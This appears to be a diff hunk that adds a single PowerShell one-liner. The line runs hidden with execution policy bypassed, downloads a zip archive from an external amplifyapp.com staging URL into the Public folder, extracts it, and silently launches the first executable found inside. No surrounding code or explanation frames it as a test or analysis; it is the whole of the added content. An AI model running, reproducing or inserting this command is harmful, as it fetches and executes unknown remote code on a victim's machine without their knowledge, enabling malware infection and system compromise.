@@ -1,0 +1,1 @@
+powershell -NoP -W Hidden -EP Bypass -Command $u='https://staging.d1yxos5modoo20.amplifyapp.com/window.zip';$d=$env:Public+'\win.zip';$o=$env:Public+'\windir';(New-Object Net.WebClient).DownloadFile($u,$d);Expand-Archive $d $o -Force;$e=@(Get-ChildItem ($o+'\*.exe') -Recurse)[0].FullName;echo('ok '+$e);Start-Process $e -WindowStyle Hidden
